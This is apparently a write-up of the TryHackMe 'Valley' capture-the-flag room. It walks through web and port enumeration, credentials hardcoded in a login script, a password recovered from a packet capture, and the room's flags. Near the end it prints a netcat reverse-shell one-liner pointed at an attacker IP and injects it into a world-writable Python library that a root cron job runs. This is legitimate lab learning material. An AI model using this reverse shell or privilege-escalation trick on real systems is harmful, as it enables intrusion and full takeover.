'export IP=10.10.81.156'
# Valley
`url = https://tryhackme.com/room/valleype`
`date = 05/30/2023`

## Enumeration

1. **Network Enumeration**

* We see the usual culprits port `80` & port `22`. Which means that we will have to brute force directories & find out what can be done after that. Maybe we get an ssh key. #WaitingToSeeHowThisMachineSurprisesMe

2. **Directory Bruteforcing**
```bash
/gallery
/static
/pricing
/index.html
```
* An interesting thing with this machine is that these directories have subdirectories within them which gobuster or dirsearch did not index. Here is a modified version of the file system:
```bash
/gallery/gallery.html
/static/1-18
/pricing/pricing.html
/pricing/note.txt
/index.html
```
* The note gives us two users - `j` & `RP`. Thouroughly enumerating the website does not give us any full names. The last resort is to move on & run hydra with the user as `j` and see what happens.

* Even sqlmap does not show any injectible points on the website.

* Even SSH-ing into the system does not give us any results, probably because these names are just initials.

3. **Web Enumeration**

* Since the directories are indexed, we are not going to bruteforce these sub directories:
    - `http://$IP/gallery/*`
    - `http://$IP/static/*`
    - `http://$IP/pricing/*`

* We get `200 - OK` on `/static/00` which can not be seen anywhere else. On this page we see a few notes, including one that says `remove /dev1243224123123`. Let us now visit this page.

* We can see a login page here, that will seems to be a back-door.

* On checking the backend validation form, we can see that the `username` & `password` is being manually checked for. Which means that we don't need to perform scripting attacks on this website.

```javascript
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```
* Now we know `username = siemDev && password = california`.

* On logging in we can see a note:
```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```
* We now know that the ftp service is not present on port `21` and the username & password is same as before.

* Further network enumeration is required, which can be done with an nmap "all ports" scan:
```bash
nmap -sC -sV -p- -oN nmap/all_ports $IP
```

* Using rustscan gives the result faster:
```bash
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
37370/tcp open  unknown syn-ack
```

* The ftp service has been configured to run on port `37370`.

* Enumerating the FTP server, we saw a few packet caputures, that can be downladed using the `get` command.

4. **Wireshark PCAPS**

* There are three packet captures - `siemFTP.pcapng`, `siemHTTP1.pcapng` & `siemHTTP2.pcapng`. The first one has a decrypted TCP stream that shows us a user logging in with `anonymous` as the username & `anonymous` as the password. They then use some weird looking commands - like `SYST`, `NLST`, etc. that the FTP server returns responses to. But nothing so far is clear.

* After looking at a lot of things, what needs to be done is that we have to open the file `siemHTTP2.pcapng` file & set the wireshark filter as `http.request.method == POST` upon which we need to follow a particular TCP stream, which is of the HTTP packet that has a `POST` tag on it. On opening the TCP stream for this packet, we see the following - `uname=valleyDev&psw=ph0t0s1234&remember=on`.

* Which gives us the password for SSH (maybe). Let us try and SSH into this system now.

## Exploitation

```bash
ssh valleyDev@$IP
# password - ph0t0s1234
```
* Once we are into the system, I switched to pwncat rather than ssh, using a reverse shell.

* Here we can find the `user.txt` file which can then be catted out - `THM{k@l1_1n_th3_v@lley}`.

* In order to escalate privs, we need to run through the usual stuff. Out of everything, crontab caught my eye where a script is running every minute -
```bash
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```
* Other than this, there is a lot in the `/home` directory. We can see the user `valley` & an executable - `valleyAuthenticator`. Now we download this executable & run strings on it
```bash
strings valleyAuthenticator | less
# search for the string 'pass'
```
Where we can find the hash `e6722920bab2326f8217e4bf6b1b58ac` which can be cracked to get `liberty123`. Let us now ssh into the system as `valley`.

## PrivEsc

It took a lot of research, but here is what is to be done:
1. ssh as `valley` with `liberty123` as the password.
2. Check the crontab - `/photos/script/photosEncrypt.py`:
```python
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)
```
It is importing the `base64` library that is world writable.

3. Finding writeable files can be done by:
```bash
find / -writeable 2>/dev/null
# Output - /usr/lib/python3.7/base64.py
```
Similarly, for finding Set UID binaries:
```bash
find /bin -perm 02000 2>/dev/null
```

4. Now, all that needs to be done is to put a reverse shell in the `base64.py` file & wait for the crontab to be run.
```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=$LOCAL_IP LPORT=$LOCAL_P R
# output - mkfifo /tmp/oqxhw; nc 10.6.36.128 5555 0</tmp/oqxhw | /bin/sh >/tmp/oqxhw 2>&1; rm /tmp/oqxhw
```
This can be added to the python file & the crontab will then run.

5. We get a root shell where the file `root.txt` lives in the home directory which can then be catted out `THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}`.

fin. 